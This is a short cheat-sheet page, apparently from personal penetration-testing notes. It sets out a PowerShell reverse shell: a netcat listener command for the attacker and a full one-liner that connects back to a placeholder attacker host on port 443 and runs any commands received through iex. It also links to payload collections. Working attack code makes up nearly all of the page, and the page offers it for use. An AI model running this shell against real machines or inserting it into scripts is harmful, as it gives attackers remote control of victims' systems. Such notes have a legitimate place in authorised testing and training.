# powershell

**Author:** Julien Bongars\
**Date:** 2026-01-05 02:41:33
**Path:**

---

PowerShell reverse shell. Listener on the attacker, one-liner on the target.

## Source machine

```bash
nc -lvnp 443
```

## Target machine

```ps1
$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

See [bash](../bash.md) for more.

## Resources

- [PayloadsAllTheThings — PowerShell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell) — more PS payloads
- [revshells.com](https://www.revshells.com/) — generated variants
